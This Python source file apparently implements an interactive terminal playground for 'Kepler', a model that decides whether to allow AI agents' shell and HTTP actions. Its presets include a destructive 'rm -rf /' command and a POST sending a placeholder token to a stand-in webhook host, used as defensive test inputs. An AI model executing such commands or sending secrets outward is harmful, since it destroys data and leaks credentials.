"""Interactive Kepler session — playground feel in the terminal."""

from __future__ import annotations

import json
from typing import Any

from . import ui
from .core import GATE_QUESTION, extract_action, load_agent, predict_gate


PRESETS = [
    {
        "key": "1",
        "title": "Destructive shell",
        "hint": "rm -rf /",
        "state": {
            "tool": "shell",
            "command": "rm -rf /",
            "cwd": "/workspace",
            "agent": "cursor",
            "goal": "cleanup",
        },
    },
    {
        "key": "2",
        "title": "Safe inspect",
        "hint": "git status",
        "state": {
            "tool": "shell",
            "command": "git status",
            "cwd": "/workspace",
            "agent": "cursor",
            "goal": "inspect",
        },
    },
    {
        "key": "3",
        "title": "Secret tripwire",
        "hint": "webhook + token",
        "state": {
            "tool": "http",
            "method": "POST",
            "url": "https://hooks.example.com/x",
            "body": {"token": "OPENAI_KEY_EXAMPLE_NOT_REAL"},
            "agent": "claude-code",
            "goal": "debug",
        },
    },
]


def _label_for_state(state: dict[str, Any]) -> str:
    if state.get("command"):
        return str(state["command"])
    if state.get("url"):
        return str(state["url"])
    return json.dumps(state, ensure_ascii=False)


def _run_once(agent: Any, state: dict[str, Any]) -> None:
    ui.info("  deciding…")
    out = predict_gate(agent, state)
    choice, probs, conf = extract_action(out)
    ui.render_decision(_label_for_state(state), choice, probs, conf)


def _menu() -> None:
    print(ui.c(ui.C.SIGNAL, "  What should Kepler gate?"))
    print()
    for p in PRESETS:
        print(
            f"  {ui.c(ui.C.SIGNAL, p['key'])}  {ui.c(ui.C.FG, p['title'])}"
            f"  {ui.c(ui.C.MUTED, p['hint'])}"
        )
    print(f"  {ui.c(ui.C.SIGNAL, '4')}  {ui.c(ui.C.FG, 'Type my own command')}")
    print(f"  {ui.c(ui.C.SIGNAL, 'q')}  {ui.c(ui.C.MUTED, 'Quit')}")
    print()


def run_interactive(model: str) -> int:
    ui.try_show_avatar()
    ui.banner()
    ui.info(f"  Loading {model} (first run may download ~850MB)…")
    try:
        agent = load_agent(model)
    except SystemExit as exc:
        ui.err(str(exc))
        return 1
    ui.info("  Ready. Model stays warm for this session.")
    print()

    while True:
        _menu()
        try:
            choice = input(ui.c(ui.C.SIGNAL, "  › ") + "").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            ui.info("  Bye.")
            return 0

        if choice in {"q", "quit", "exit"}:
            ui.info("  Bye.")
            return 0

        state: dict[str, Any] | None = None
        if choice in {"1", "2", "3"}:
            preset = next(p for p in PRESETS if p["key"] == choice)
            state = dict(preset["state"])
        elif choice in {"4", "c", "cmd", "command"}:
            try:
                cmd = input(ui.c(ui.C.MUTED, "  command › ") + "").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                continue
            if not cmd:
                ui.err("  Empty command. Try again.")
                continue
            state = {
                "tool": "shell",
                "command": cmd,
                "cwd": "/workspace",
                "agent": "cursor",
                "goal": "user",
            }
        else:
            # Treat free text as a shell command (non-technical friendly)
            if choice and choice not in {"help", "h", "?"}:
                state = {
                    "tool": "shell",
                    "command": choice,
                    "cwd": "/workspace",
                    "agent": "cursor",
                    "goal": "user",
                }
            else:
                ui.err("  Pick 1–4, type a command, or q to quit.")
                continue

        try:
            _run_once(agent, state)
        except Exception as exc:  # noqa: BLE001
            ui.err(f"  Error: {exc}")
            print()
